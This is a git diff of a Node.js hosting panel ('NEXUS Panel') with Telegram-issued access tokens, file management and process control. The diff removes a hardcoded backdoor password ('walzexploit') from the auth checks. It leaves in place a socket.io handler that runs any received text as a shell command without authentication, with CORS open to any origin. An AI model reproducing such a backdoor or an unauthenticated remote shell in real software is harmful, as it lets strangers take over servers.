@@ -21,11 +21,15 @@ const uploadDir = path.join(__dirname, 'uploads');
 function loadTokens() {
     try {
         if (fs.existsSync(DB_FILE)) activeTokens = JSON.parse(fs.readFileSync(DB_FILE, 'utf8')) || {};
-    } catch (e) { activeTokens = {}; }
+    } catch (e) {
+        activeTokens = {};
+    }
 }
 
 function saveTokens() {
-    try { fs.writeFileSync(DB_FILE, JSON.stringify(activeTokens, null, 2)); } catch (e) {}
+    try {
+        fs.writeFileSync(DB_FILE, JSON.stringify(activeTokens, null, 2));
+    } catch (e) {}
 }
 
 function generateHardToken() {
@@ -45,24 +49,45 @@ const io = socketIo(server, { cors: { origin: '*', methods: ['GET', 'POST'] } })
 let bot = null;
 try {
     bot = new TelegramBot(TG_TOKEN, { polling: true });
+    
     bot.on('polling_error', (error) => {
         if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
             if (bot) bot.stopPolling().catch(() => {});
         }
     });
+
     bot.onText(/\/id/, (msg) => {
         bot.sendMessage(msg.chat.id, `🆔 ID: <code>${msg.chat.id}</code>`, { parse_mode: 'HTML' });
     });
+
     bot.onText(/\/akses (\d+)/, (msg, match) => {
         const chatId = String(msg.chat.id);
         if (chatId !== String(OWNER_ID)) return;
+        
         const days = parseInt(match[1]);
         if (!days) return;
+        
         const token = generateHardToken();
         const expired = Date.now() + (days * 86400000);
+        
         activeTokens[token] = expired;
         saveTokens();
+        
         bot.sendMessage(chatId, `✅ <b>AKSES DIBUAT</b>\n🔑: <code>${token}</code>\n⏳: ${days} Hari\n📅: ${new Date(expired).toLocaleDateString('id-ID')}`, { parse_mode: 'HTML' });
+    });
+
+    bot.onText(/\/list/, (msg) => {
+        const chatId = String(msg.chat.id);
+        if (chatId !== String(OWNER_ID)) return;
+        
+        const tokens = Object.keys(activeTokens);
+        if (tokens.length === 0) {
+            return bot.sendMessage(chatId, `⚠️ <b>KOSONG</b>\nTidak ada token yang aktif.`, { parse_mode: 'HTML' });
+        }
+        
+        let reply = `✅ <b>DAFTAR TOKEN AKTIF:</b>\n\n`;
+        tokens.forEach(t => reply += `<code>${t}</code>\n`);
+        bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
     });
 } catch (e) {}
 
@@ -74,14 +99,19 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
 
 const checkAuth = (req, res, next) => {
-    const token = String(req.headers.authorization || '').trim();
-    if (token === ADMIN_PASS || token === 'walzexploit') return next();
+    const rawToken = String(req.headers.authorization || '');
+    const token = rawToken.replace(/[^a-zA-Z0-9-]/g, '');
+
+    if (token === ADMIN_PASS) return next();
+    
     if (!token || !activeTokens[token]) return res.status(401).json({ success: false, msg: 'Token Invalid' });
+    
     if (Date.now() > activeTokens[token]) {
         delete activeTokens[token];
         saveTokens();
         return res.status(401).json({ success: false, msg: 'Token Expired' });
     }
+    
     next();
 };
 
@@ -95,6 +125,7 @@ const getStats = () => {
         uptimeStr = `${h}:${m}:${s}`;
     }
     const ramUsed = Math.round((os.totalmem() - os.freemem()) / 1024 / 1024);
+    
     return {
         cpu: os.loadavg()[0].toFixed(2),
         ram: ramUsed.toString(),
@@ -114,10 +145,13 @@ const upload = multer({
 });
 
 app.post('/api/login', (req, res) => {
-    const token = String(req.body.token || '').trim();
-    if (token === ADMIN_PASS || token === 'walzexploit') {
+    const rawToken = String(req.body.token || '');
+    const token = rawToken.replace(/[^a-zA-Z0-9-]/g, '');
+
+    if (token === ADMIN_PASS) {
         return res.json({ success: true });
     }
+    
     if (activeTokens[token]) {
         if (Date.now() > activeTokens[token]) {
             delete activeTokens[token];
@@ -126,22 +160,32 @@ app.post('/api/login', (req, res) => {
         }
         return res.json({ success: true });
     }
+    
     res.json({ success: false, msg: 'Token Invalid' });
 });
 
 app.post('/api/files', checkAuth, (req, res) => {
     let reqPath = String(req.body.path || '').trim();
     if (reqPath.startsWith('/root/home')) reqPath = reqPath.replace('/root/home', '');
+    
     const target = path.join(uploadDir, reqPath);
     if (!path.resolve(target).startsWith(path.resolve(uploadDir))) return res.json({ success: false, data: [] });
+    
     try {
         if (!fs.existsSync(target)) return res.json({ success: true, data: [] });
+        
         const files = fs.readdirSync(target);
         const data = files.map(f => {
             const fp = path.join(target, f);
             const s = fs.statSync(fp);
-            return { name: f, isDir: s.isDirectory(), path: path.relative(uploadDir, fp).replace(/\\/g, '/'), size: s.size };
+            return { 
+                name: f, 
+                isDir: s.isDirectory(), 
+                path: path.relative(uploadDir, fp).replace(/\\/g, '/'), 
+                size: s.size 
+            };
         }).filter(Boolean);
+        
         data.sort((a, b) => b.isDir - a.isDir);
         res.json({ success: true, data });
     } catch (e) {
@@ -198,14 +242,19 @@ app.post('/api/unzip', checkAuth, (req, res) => {
 
 app.post('/api/start', checkAuth, (req, res) => {
     if (isRunning) return res.json({ success: false, msg: 'Server sudah berjalan' });
+    
     const cmd = String(req.body.command || 'npm install && npm start').trim();
     if (!cmd) return res.json({ success: false, msg: 'Command tidak valid' });
+    
     isRunning = true;
     startTime = Date.now();
     broadcastStats();
+    
     currentProcess = spawn(cmd, { cwd: uploadDir, shell: true });
+    
     currentProcess.stdout.on('data', d => io.emit('log', d.toString()));
     currentProcess.stderr.on('data', d => io.emit('log', `\x1b[31m${d.toString()}\x1b[0m`));
+    
     currentProcess.on('close', (code) => {
         isRunning = false;
         startTime = null;
@@ -213,6 +262,7 @@ app.post('/api/start', checkAuth, (req, res) => {
         broadcastStats();
         io.emit('log', `\n\x1b[31m[SYSTEM] Process terminated (Code: ${code})\x1b[0m\n`);
     });
+    
     res.json({ success: true, msg: 'Server started' });
 });
 
@@ -224,19 +274,26 @@ app.post('/api/stop', checkAuth, (req, res) => {
         startTime = null;
         broadcastStats();
         res.json({ success: true, msg: 'Server stopped' });
-    } else res.json({ success: false, msg: 'Server tidak berjalan' });
+    } else {
+        res.json({ success: false, msg: 'Server tidak berjalan' });
+    }
 });
 
 app.get('/api/expiry', checkAuth, (req, res) => {
-    const token = String(req.headers.authorization || '').trim();
-    if (token === ADMIN_PASS || token === 'walzexploit') {
+    const rawToken = String(req.headers.authorization || '');
+    const token = rawToken.replace(/[^a-zA-Z0-9-]/g, '');
+
+    if (token === ADMIN_PASS) {
         return res.json({ success: true, expired: false, remainingSeconds: 30 * 86400, totalSeconds: 30 * 86400 });
     }
+    
     const expiredTime = activeTokens[token];
     if (!expiredTime) return res.json({ success: false, msg: 'Token tidak ditemukan' });
+    
     const now = Date.now();
     const remaining = Math.max(0, Math.floor((expiredTime - now) / 1000));
     const total = 30 * 86400;
+    
     res.json({
         success: true,
         expired: remaining <= 0,
@@ -248,16 +305,20 @@ app.get('/api/expiry', checkAuth, (req, res) => {
 io.on('connection', (socket) => {
     socket.emit('stats', getStats());
     const interval = setInterval(() => socket.emit('stats', getStats()), 2000);
+    
     socket.on('disconnect', () => clearInterval(interval));
+    
     socket.on('input', (data) => {
         const cmd = String(data || '').trim();
         if (!cmd) return;
+        
         if (currentProcess && isRunning) {
             currentProcess.stdin.write(cmd + '\n');
             io.emit('log', `\x1b[32m> ${cmd}\x1b[0m\n`);
         } else {
             io.emit('log', `\x1b[32m$ ${cmd}\x1b[0m\n`);
             const shell = spawn(cmd, { cwd: uploadDir, shell: true });
+            
             shell.stdout.on('data', d => io.emit('log', d.toString()));
             shell.stderr.on('data', d => io.emit('log', `\x1b[31m${d.toString()}\x1b[0m`));
         }
@@ -267,5 +328,5 @@ io.on('connection', (socket) => {
 app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 server.listen(PORT, () => {
-    console.log(`🚀 NEXUS Panel v2.1 berjalan di http://localhost:${PORT}`);
+    console.log(`NEXUS Panel v2.1 running on port ${PORT}`);
 });
